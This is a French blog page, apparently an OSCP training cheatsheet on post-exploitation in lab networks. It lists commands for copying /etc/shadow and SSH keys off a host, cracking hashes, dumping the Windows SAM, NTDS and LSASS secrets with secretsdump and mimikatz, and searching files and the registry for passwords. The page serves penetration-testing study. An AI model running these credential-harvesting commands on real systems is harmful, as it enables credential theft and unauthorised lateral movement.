<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Post-Exploitation pour l&#39;OSCP | Kransy</title>
<meta name="keywords" content="">
<meta name="description" content="Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n&rsquo;est pas exhaustive et peut contenir des coquilles, n&rsquo;hésitez pas à me les remonter sur Discord s&rsquo;il manque une ou des commandes ou s&rsquo;il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l&rsquo;OSCP, donc je n&rsquo;irai pas dans les détails des artefacts que l&rsquo;on pourrait trouver sur une machine, je n&rsquo;aborderai donc que la post-exploitation de manière classique.">
<meta name="author" content="Kransy">
<link rel="canonical" href="https://kransy.cyberkoopas.fr/cheatsheets/post-exploitation/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.ef56143ae1e6c229577d848ee596d9d027e93cd7eb12af569102fed92900e516.css" integrity="sha256-71YUOuHmwilXfYSO5ZbZ0CfpPNfrEq9WkQL&#43;2SkA5RY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://kransy.cyberkoopas.fr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://kransy.cyberkoopas.fr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://kransy.cyberkoopas.fr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://kransy.cyberkoopas.fr/apple-touch-icon.png">
<link rel="mask-icon" href="https://kransy.cyberkoopas.fr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Post-Exploitation pour l&#39;OSCP" />
<meta property="og:description" content="Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n&rsquo;est pas exhaustive et peut contenir des coquilles, n&rsquo;hésitez pas à me les remonter sur Discord s&rsquo;il manque une ou des commandes ou s&rsquo;il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l&rsquo;OSCP, donc je n&rsquo;irai pas dans les détails des artefacts que l&rsquo;on pourrait trouver sur une machine, je n&rsquo;aborderai donc que la post-exploitation de manière classique." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kransy.cyberkoopas.fr/cheatsheets/post-exploitation/" /><meta property="article:section" content="cheatsheets" />
<meta property="article:published_time" content="2023-05-29T04:58:35-04:00" />
<meta property="article:modified_time" content="2023-05-29T04:58:35-04:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Post-Exploitation pour l&#39;OSCP"/>
<meta name="twitter:description" content="Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n&rsquo;est pas exhaustive et peut contenir des coquilles, n&rsquo;hésitez pas à me les remonter sur Discord s&rsquo;il manque une ou des commandes ou s&rsquo;il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l&rsquo;OSCP, donc je n&rsquo;irai pas dans les détails des artefacts que l&rsquo;on pourrait trouver sur une machine, je n&rsquo;aborderai donc que la post-exploitation de manière classique."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Cheatsheets",
      "item": "https://kransy.cyberkoopas.fr/cheatsheets/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Post-Exploitation pour l'OSCP",
      "item": "https://kransy.cyberkoopas.fr/cheatsheets/post-exploitation/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Post-Exploitation pour l'OSCP",
  "name": "Post-Exploitation pour l\u0027OSCP",
  "description": "Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n\u0026rsquo;est pas exhaustive et peut contenir des coquilles, n\u0026rsquo;hésitez pas à me les remonter sur Discord s\u0026rsquo;il manque une ou des commandes ou s\u0026rsquo;il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l\u0026rsquo;OSCP, donc je n\u0026rsquo;irai pas dans les détails des artefacts que l\u0026rsquo;on pourrait trouver sur une machine, je n\u0026rsquo;aborderai donc que la post-exploitation de manière classique.",
  "keywords": [
    
  ],
  "articleBody": "Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n’est pas exhaustive et peut contenir des coquilles, n’hésitez pas à me les remonter sur Discord s’il manque une ou des commandes ou s’il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l’OSCP, donc je n’irai pas dans les détails des artefacts que l’on pourrait trouver sur une machine, je n’aborderai donc que la post-exploitation de manière classique.\n0. Introduction 1. Linux 1.1 - Dump /etc/passwd 1.2 - Dump /etc/shadow 1.3 - John / Hashcat 1.4 - Clés SSH 1.5 - Chercher des credentials dans des fichiers 1.6 - Fichiers / dossiers utiles 1.7 - Routes et ports 2. Windows 2.1 - Impacket-secretsdump 2.2 - Mimikatz 2.3 - Fichiers / dossiers utiles 2.4 - Chercher des credentials dans des fichiers 2.5 - Routes et ports Introduction Dans les labs avec plusieurs machines, type les prolabs HTBs, on est souvent amené à faire de la post-exploitation à chaque compromission de machine pour récolter des informations et potentiellement les ré-utiliser. Dans ce genre d’environnement, ca peut nous permettre de potentiellement obtenir des accès à de nouvelles machines.\nLinux Dump /etc/passwd cat /etc/passwd \u003e /tmp/passwd scp user@IP:/tmp/passwd /dump/loot/. Dump /etc/shadow cat /etc/shadow \u003e /tmp/shadow scp user@IP:/tmp/shadow /dump/loot/. John / Hashcat John : https://github.com/openwall/john Hashcat : https://github.com/hashcat/hashcat\nunshadow passwd shadow \u003e hashs hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt ou john --wordlist=/usr/share/wordlists/rockyou.txt hashes Clés SSH les clés SSH sont dans /home//.ssh/id_rsa scp user@IP:/home//.ssh/id_rsa /dump/loot/. Les clés SSH peuvent être protégé par un mot de passe, dans ce cas : ssh2john id_rsa \u003e crackme john crackme --wordlist=/usr/share/wordlists/rockyou.txt Chercher des credentials Je trouvais grep plutôt lent, donc ripgrep (merci WarthogTK pour la découverte) : https://github.com/BurntSushi/ripgrep.\nLes résultats sont souvent très verbeux, ne pas hésitez de les trier à coup de grep, il faut faire petit à petit pour ne récupérer uniquement les infos dont on a besoin, ripgrep permet dans le cas ici, d’être plus rapide que grep pour le “tri large”.\nripgrep =\u003e ripgrep pass . =\u003e ripgrep login . le readme du github explique plutôt bien les avantages et comment utiliser ripgrep Fichiers / dossiers utiles Ces fichiers peuvent contenir des credentials ou autre informations utiles : - /home//.bash_history - /var/apache2/config.inc - /var/mail/* - /opt/. - /var/www/. -\u003e un site qui tourne, check la config. Routes et ports Ces commandes vous permettront de découvrir potentiellement de nouveaux réseaux : - ifconfig - ip a - arp -a - netstat -laputen - ss Windows Impacket-Secretsdump Secretsdump permets de dump les secrets présent sur une machine, on y retrouve très souvent des credentials qui nous permettront de faire des mouvements latéraux et d’avoir accès à de nouvelles machines. Impacket : https://github.com/fortra/impacket\nIl y a plusieurs façons de l'utiliser : Dump du SAM, SYSTEM et du SECURITY en LOCAL : Sur la machine cible : - reg save hklm\\sam c:\\Users\\Public\\sam - reg save hklm\\system c:\\Users\\Public\\system - reg save hklm\\security c:\\Users\\Public\\security Une fois transféré sur notre machine, on peut utiliser : - impacket-secretsdump -sam SAM -system SYSTEM LOCAL On peut aussi faire pareil avec le NTDS : Sur la machine cible : - ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\NTDS\" quit quit Une fois transféré sur notre machine, on peut utiliser : - impacket-secretsdump -ntds NTDS -system SYSTEM LOCAL Si on a un compte administrateur sur la machine et qu'on veut dump les secrets : Sur notre machine : - impacket-secretsdump :@ -outputfile hashes - impacket-secretsdump @ -hashes : Mimikatz Mimikatz : https://github.com/ParrotSec/mimikatz\nAvec un compte administrateur local, on peut récupérer beaucoup de choses via mimikatz, mais ce qui va nous intéresser dans notre cas c'est : - privilege::debug -\u003e permet d'obtenir les droits de debug \"SeDebugPrivilege\" qui sont nécessaire pour certaines actions de Mimikatz. - token::elevate -\u003e permet d'usurper un utilisateur, par défaut NT Authority\\System. Les commandes suivantes nécessites le droit SeDebugPrivilege ou d'être NT Authority, donc soit privilege::debug soit token::elevate. En premier temps, il vaut mieux essayer avec uniquement privilege::debug, ce qui devrait être suffisant, sinon en plus du privilege::debug, faites le token::elevate. - sekurlsa::logonpasswords -\u003e permet de récupérer les secrets du LSASS (comptes qui se sont connectés recemment, y compris les utilisateurs du domaine s'étant connecté à la machine). - lsadump::sam -\u003e permet de récupérer les hashes dans le SAM (comptes locaux). - vault::cred -\u003e permet de récupérer les credentials dans le vault windows (par exemple, si des credentials sont utilisés pour run une schedule task, c'est ici que l'on va retrouver ces credentials). Fichiers / dossiers utiles Ces fichiers peuvent contenir des credentials ou autre informations utiles : - C:\\xampp\\passwords.txt - C:\\Users\\\u003cUSER\u003e\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt (aussi trouvable via les commandes powershells Get-History puis (Get-PSReadlineOption).HistorySavePath) Chercher des credentials Attention à cette étape, certains fichiers et/ou dossiers contiennent des credentials qui pourront être utile pour la suite. Ripgrep marche aussi bien sur linux que sur windows : https://github.com/BurntSushi/ripgrep\nAvec Ripgrep : - .\\ripgrep.exe Attention, probablement très verbeux : - .\\ripgrep.exe password C:\\ - .\\ripgrep.exe pass C:\\ Avec Powershell : - powershell -c Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -Hidden -ErrorAction SilentlyContinue - powershell -c Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue - powershell -c Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue - C:\\Users\u003e powershell -c Get-ChildItem -Recurse -Depth 2 En général, je commence par faire un Get-ChildItem recursif avec une profondeur à 2-3 sur C:\\Users\\. avant d'aller chercher autre part, je regarde tous les fichiers qui sont affichés et je m'attarde sur ceux qui sont \"anormaux\" ou potentiellement crée par un utilisateur. Dans les registres : - reg query HKLM /f password /t REG_SZ /s - reg query HKCU /f password /t REG_SZ /s En fonction des logiciels installés sur la machine il peut y en avoir aussi dans : - VNC : reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" - Windows AutoLogin : reg query \"HKLM\\Software\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" - SNMP : reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" - PuTTY : reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" Ne pas hésiter à regarder dans les dossiers des services qui tournent sur la machine (site web sur xampp par exemple, ftp si on ne sait pas ce qu'il y a dessus, share smb, ...). Routes et ports - ipconfig - arp -a - route print - netstat -ano ",
  "wordCount" : "1036",
  "inLanguage": "en",
  "datePublished": "2023-05-29T04:58:35-04:00",
  "dateModified": "2023-05-29T04:58:35-04:00",
  "author":{
    "@type": "Person",
    "name": "Kransy"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://kransy.cyberkoopas.fr/cheatsheets/post-exploitation/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Kransy",
    "logo": {
      "@type": "ImageObject",
      "url": "https://kransy.cyberkoopas.fr/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://kransy.cyberkoopas.fr/" accesskey="h" title="Kransy (Alt + H)">
                <img src="https://kransy.cyberkoopas.fr/logo.png" alt="" aria-label="logo"
                    height="30">Kransy</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://kransy.cyberkoopas.fr/writeups/" title="Writeups">
                    <span>Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://kransy.cyberkoopas.fr/cheatsheets/" title="Cheatsheets">
                    <span>Cheatsheets</span>
                </a>
            </li>
            <li>
                <a href="https://kransy.cyberkoopas.fr/retex/" title="Retex">
                    <span>Retex</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Post-Exploitation pour l&#39;OSCP
    </h1>
    <div class="post-meta"><span title='2023-05-29 04:58:35 -0400 EDT'>May 29, 2023</span>&nbsp;·&nbsp;Kransy

</div>
  </header> 
  <div class="post-content"><p>Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n&rsquo;est pas exhaustive et peut contenir des coquilles, n&rsquo;hésitez pas à me les remonter sur Discord s&rsquo;il manque une ou des commandes ou s&rsquo;il y a une ou plusieurs erreurs. Cette cheatsheet a uniquement pour but l&rsquo;OSCP, donc je n&rsquo;irai pas dans les détails des artefacts que l&rsquo;on pourrait trouver sur une machine, je n&rsquo;aborderai donc que la post-exploitation de manière classique.</p>
<ul>
<li><a href="#introduction">0. Introduction</a></li>
<li><a href="#linux">1. Linux</a>
<ul>
<li><a href="#dump-etcpasswd">1.1 - Dump /etc/passwd</a></li>
<li><a href="#dump-etcshadow">1.2 - Dump /etc/shadow</a></li>
<li><a href="#john--hashcat">1.3 - John / Hashcat</a></li>
<li><a href="#cl%C3%A9s-ssh">1.4 - Clés SSH</a></li>
<li><a href="#chercher-des-credentials">1.5 - Chercher des credentials dans des fichiers</a></li>
<li><a href="#fichiers--dossiers-utiles">1.6 - Fichiers / dossiers utiles</a></li>
<li><a href="#routes-et-ports">1.7 - Routes et ports</a></li>
</ul>
</li>
<li><a href="#windows">2. Windows</a>
<ul>
<li><a href="#impacket-secretsdump">2.1 - Impacket-secretsdump</a></li>
<li><a href="#mimikatz">2.2 - Mimikatz</a></li>
<li><a href="#fichiers--dossiers-utiles-1">2.3 - Fichiers / dossiers utiles</a></li>
<li><a href="#chercher-des-credentials-1">2.4 - Chercher des credentials dans des fichiers</a></li>
<li><a href="#routes-et-ports-1">2.5 - Routes et ports</a></li>
</ul>
</li>
</ul>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>Dans les labs avec plusieurs machines, type les prolabs HTBs, on est souvent amené à faire de la post-exploitation à chaque compromission de machine pour récolter des informations et potentiellement les ré-utiliser. Dans ce genre d&rsquo;environnement, ca peut nous permettre de potentiellement obtenir des accès à de nouvelles machines.</p>
<h2 id="linux">Linux<a hidden class="anchor" aria-hidden="true" href="#linux">#</a></h2>
<h3 id="dump-etcpasswd">Dump /etc/passwd<a hidden class="anchor" aria-hidden="true" href="#dump-etcpasswd">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/passwd &gt; /tmp/passwd
</span></span><span style="display:flex;"><span>scp user@IP:/tmp/passwd /dump/loot/.
</span></span></code></pre></div><h3 id="dump-etcshadow">Dump /etc/shadow<a hidden class="anchor" aria-hidden="true" href="#dump-etcshadow">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /etc/shadow &gt; /tmp/shadow
</span></span><span style="display:flex;"><span>scp user@IP:/tmp/shadow /dump/loot/.
</span></span></code></pre></div><h3 id="john--hashcat">John / Hashcat<a hidden class="anchor" aria-hidden="true" href="#john--hashcat">#</a></h3>
<p>John : <a href="https://github.com/openwall/john">https://github.com/openwall/john</a>
Hashcat : <a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>unshadow passwd shadow &gt; hashs
</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1800</span> -a <span style="color:#ae81ff">0</span> hashes /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>ou
</span></span><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hashes
</span></span></code></pre></div><h3 id="clés-ssh">Clés SSH<a hidden class="anchor" aria-hidden="true" href="#clés-ssh">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>les clés SSH sont dans /home/&lt;USER&gt;/.ssh/id_rsa
</span></span><span style="display:flex;"><span>scp user@IP:/home/&lt;USER&gt;/.ssh/id_rsa /dump/loot/.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Les clés SSH peuvent être protégé par un mot de passe, dans ce cas :
</span></span><span style="display:flex;"><span>ssh2john id_rsa &gt; crackme
</span></span><span style="display:flex;"><span>john crackme --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><h3 id="chercher-des-credentials">Chercher des credentials<a hidden class="anchor" aria-hidden="true" href="#chercher-des-credentials">#</a></h3>
<p>Je trouvais grep plutôt lent, donc ripgrep (merci WarthogTK pour la découverte) :
<a href="https://github.com/BurntSushi/ripgrep">https://github.com/BurntSushi/ripgrep</a>.</p>
<p>Les résultats sont souvent très verbeux, ne pas hésitez de les trier à coup de grep, il faut faire petit à petit pour ne récupérer uniquement les infos dont on a besoin, ripgrep permet dans le cas ici, d&rsquo;être plus rapide que grep pour le &ldquo;tri large&rdquo;.</p>
<pre tabindex="0"><code>ripgrep &lt;mot&gt; &lt;chemin&gt;
=&gt; ripgrep pass .
=&gt; ripgrep login .
le readme du github explique plutôt bien les avantages et comment utiliser ripgrep
</code></pre><h3 id="fichiers--dossiers-utiles">Fichiers / dossiers utiles<a hidden class="anchor" aria-hidden="true" href="#fichiers--dossiers-utiles">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Ces fichiers peuvent contenir des credentials ou autre informations utiles :
</span></span><span style="display:flex;"><span>- /home/&lt;USER&gt;/.bash_history
</span></span><span style="display:flex;"><span>- /var/apache2/config.inc
</span></span><span style="display:flex;"><span>- /var/mail/*
</span></span><span style="display:flex;"><span>- /opt/. 
</span></span><span style="display:flex;"><span>- /var/www/. -&gt; un site qui tourne, check la config.
</span></span></code></pre></div><h3 id="routes-et-ports">Routes et ports<a hidden class="anchor" aria-hidden="true" href="#routes-et-ports">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Ces commandes vous permettront de découvrir potentiellement de nouveaux réseaux :
</span></span><span style="display:flex;"><span>- ifconfig
</span></span><span style="display:flex;"><span>- ip a
</span></span><span style="display:flex;"><span>- arp -a 
</span></span><span style="display:flex;"><span>- netstat -laputen
</span></span><span style="display:flex;"><span>- ss
</span></span></code></pre></div><h2 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h2>
<h3 id="impacket-secretsdump">Impacket-Secretsdump<a hidden class="anchor" aria-hidden="true" href="#impacket-secretsdump">#</a></h3>
<p>Secretsdump permets de dump les secrets présent sur une machine, on y retrouve très souvent des credentials qui nous permettront de faire des mouvements latéraux et d&rsquo;avoir accès à de nouvelles machines.
Impacket : <a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Il y a plusieurs façons de l<span style="color:#e6db74">&#39;utiliser :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Dump du SAM, SYSTEM et du SECURITY en LOCAL :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sur la machine cible :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- reg save hklm\sam c:\Users\Public\sam
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- reg save hklm\system c:\Users\Public\system
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- reg save hklm\security c:\Users\Public\security
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Une fois transféré sur notre machine, on peut utiliser :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- impacket-secretsdump -sam SAM -system SYSTEM LOCAL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">On peut aussi faire pareil avec le NTDS :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Sur la machine cible :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- ntdsutil &#34;activate instance ntds&#34; &#34;ifm&#34; &#34;create full C:\Windows\Temp\NTDS&#34; quit quit
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Une fois transféré sur notre machine, on peut utiliser :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- impacket-secretsdump -ntds NTDS -system SYSTEM LOCAL 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Si on a un compte administrateur sur la machine et qu&#39;</span>on veut dump les secrets :
</span></span><span style="display:flex;"><span>Sur notre machine :
</span></span><span style="display:flex;"><span>- impacket-secretsdump &lt;user&gt;:&lt;password&gt;@&lt;ip&gt; -outputfile hashes
</span></span><span style="display:flex;"><span>- impacket-secretsdump &lt;user&gt;@&lt;ip&gt; -hashes :&lt;NTHash&gt;
</span></span></code></pre></div><h3 id="mimikatz">Mimikatz<a hidden class="anchor" aria-hidden="true" href="#mimikatz">#</a></h3>
<p>Mimikatz : <a href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Avec un compte administrateur local, on peut récupérer beaucoup de choses via mimikatz, mais ce qui va nous intéresser dans notre cas c<span style="color:#e6db74">&#39;est :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- privilege::debug -&gt; permet d&#39;</span>obtenir les droits de debug <span style="color:#e6db74">&#34;SeDebugPrivilege&#34;</span> qui sont nécessaire pour certaines actions de Mimikatz. 
</span></span><span style="display:flex;"><span>- token::elevate -&gt; permet d<span style="color:#e6db74">&#39;usurper un utilisateur, par défaut NT Authority\System.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Les commandes suivantes nécessites le droit SeDebugPrivilege ou d&#39;</span>être NT Authority, donc soit privilege::debug soit token::elevate.
</span></span><span style="display:flex;"><span>En premier temps, il vaut mieux essayer avec uniquement privilege::debug, ce qui devrait être suffisant, sinon en plus du privilege::debug, faites le token::elevate.
</span></span><span style="display:flex;"><span>- sekurlsa::logonpasswords -&gt; permet de récupérer les secrets du LSASS <span style="color:#f92672">(</span>comptes qui se sont connectés recemment, y compris les utilisateurs du domaine s<span style="color:#e6db74">&#39;étant connecté à la machine).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- lsadump::sam -&gt; permet de récupérer les hashes dans le SAM (comptes locaux).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- vault::cred -&gt; permet de récupérer les credentials dans le vault windows (par exemple, si des credentials sont utilisés pour run une schedule task, c&#39;</span>est ici que l<span style="color:#960050;background-color:#1e0010">&#39;</span>on va retrouver ces credentials<span style="color:#f92672">)</span>.
</span></span></code></pre></div><h3 id="fichiers--dossiers-utiles-1">Fichiers / dossiers utiles<a hidden class="anchor" aria-hidden="true" href="#fichiers--dossiers-utiles-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Ces fichiers peuvent contenir des credentials ou autre informations utiles :
</span></span><span style="display:flex;"><span>- C:<span style="color:#ae81ff">\x</span>ampp<span style="color:#ae81ff">\p</span>asswords.txt
</span></span><span style="display:flex;"><span>- C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&lt;</span>USER&gt;<span style="color:#ae81ff">\A</span>ppData<span style="color:#ae81ff">\R</span>oaming<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>owerShell<span style="color:#ae81ff">\P</span>SReadLine<span style="color:#ae81ff">\C</span>onsoleHost_history.txt <span style="color:#f92672">(</span>aussi trouvable via les commandes powershells Get-History puis <span style="color:#f92672">(</span>Get-PSReadlineOption<span style="color:#f92672">)</span>.HistorySavePath<span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="chercher-des-credentials-1">Chercher des credentials<a hidden class="anchor" aria-hidden="true" href="#chercher-des-credentials-1">#</a></h3>
<p>Attention à cette étape, certains fichiers et/ou dossiers contiennent des credentials qui pourront être utile pour la suite.
Ripgrep marche aussi bien sur linux que sur windows :
<a href="https://github.com/BurntSushi/ripgrep">https://github.com/BurntSushi/ripgrep</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Avec Ripgrep :
</span></span><span style="display:flex;"><span>- .<span style="color:#ae81ff">\r</span>ipgrep.exe &lt;MOT&gt; &lt;PATH&gt;
</span></span><span style="display:flex;"><span>Attention, probablement très verbeux :
</span></span><span style="display:flex;"><span>- .<span style="color:#ae81ff">\r</span>ipgrep.exe password C:<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>- .<span style="color:#ae81ff">\r</span>ipgrep.exe pass C:<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
</span></span><span style="display:flex;"><span>Avec Powershell :
</span></span><span style="display:flex;"><span>- powershell -c Get-ChildItem -Path C:<span style="color:#ae81ff">\ </span>-Include *.kdbx -File -Recurse -Hidden -ErrorAction SilentlyContinue
</span></span><span style="display:flex;"><span>- powershell -c Get-ChildItem -Path C:<span style="color:#ae81ff">\x</span>ampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
</span></span><span style="display:flex;"><span>- powershell -c Get-ChildItem -Path C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\ </span>-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
</span></span><span style="display:flex;"><span>- C:<span style="color:#ae81ff">\U</span>sers&gt; powershell -c Get-ChildItem -Recurse -Depth <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>En général, je commence par faire un Get-ChildItem recursif avec une profondeur à 2-3 sur C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\.</span> avant d<span style="color:#e6db74">&#39;aller chercher autre part, je regarde tous les fichiers qui sont affichés et je m&#39;</span>attarde sur ceux qui sont <span style="color:#e6db74">&#34;anormaux&#34;</span> ou potentiellement crée par un utilisateur.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Dans les registres : 
</span></span><span style="display:flex;"><span>- reg query HKLM /f password /t REG_SZ /s
</span></span><span style="display:flex;"><span>- reg query HKCU /f password /t REG_SZ /s
</span></span><span style="display:flex;"><span>En fonction des logiciels installés sur la machine il peut y en avoir aussi dans :
